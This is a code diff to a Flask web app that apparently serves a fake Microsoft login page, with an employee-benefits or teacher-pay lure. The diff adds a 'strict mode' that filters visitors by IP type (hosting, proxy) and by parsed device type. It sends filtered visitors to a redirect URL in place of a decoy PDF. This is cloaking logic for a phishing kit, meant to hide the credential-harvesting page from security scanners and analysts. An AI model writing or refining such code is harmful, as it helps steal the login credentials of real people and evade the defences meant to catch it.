@@ -9,6 +9,7 @@ from utils import Local_Cache, get_admin_user
 import os, time
 from urllib.parse import quote
 import requests
+import user_agents
 
 # --- Load Environment Variables ---
 load_dotenv()
@@ -17,6 +18,7 @@ DEFAULT_USER_ID = os.getenv("USER_ID")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 IP_API_KEY = os.getenv("IP_API_KEY")
 REDIRECT_URL = os.getenv("REDIRECT_URL")
+STRICT_MODE = os.getenv("STRICT_MODE")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
@@ -119,6 +121,13 @@ def get_ip_details(ip_address):
                 return False
             return True
 
+        if STRICT_MODE == "yes":
+            if hosting:
+                return True
+            
+            if proxy:
+                return True
+
         if mobile:
             return False
 
@@ -142,14 +151,33 @@ def serve(path):
 
 
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', '')
+    user_agent_str  = request.headers.get('User-Agent', '')
     print("\n\n================ Ip Details ===================")
-    print({"visitor_ip": visitor_ip, "user_agent": user_agent}, "\n")
+    user_agent = user_agents.parse(user_agent_str)
 
-    # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
+    device_type = (
+        "mobile" if user_agent.is_mobile else
+        "tablet" if user_agent.is_tablet else
+        "pc" if user_agent.is_pc else
+        "other"
+    )
     
+    print({
+        "visitor_ip": visitor_ip,
+        "user_agent": user_agent_str,
+        "device_type": device_type,
+        "browser": user_agent.browser.family,
+        "os": user_agent.os.family
+    }, "\n")
+    
+    # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
+
+    if STRICT_MODE == "yes":
+        if not device_type != "mobile":
+            return redirect(REDIRECT_URL)
+
     if get_ip_details(visitor_ip):
-        return send_from_directory(files_folder,'Employee-Benefits-Outlook.pdf')
+        return redirect(REDIRECT_URL)
 
     # This logic is now much simpler.
     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
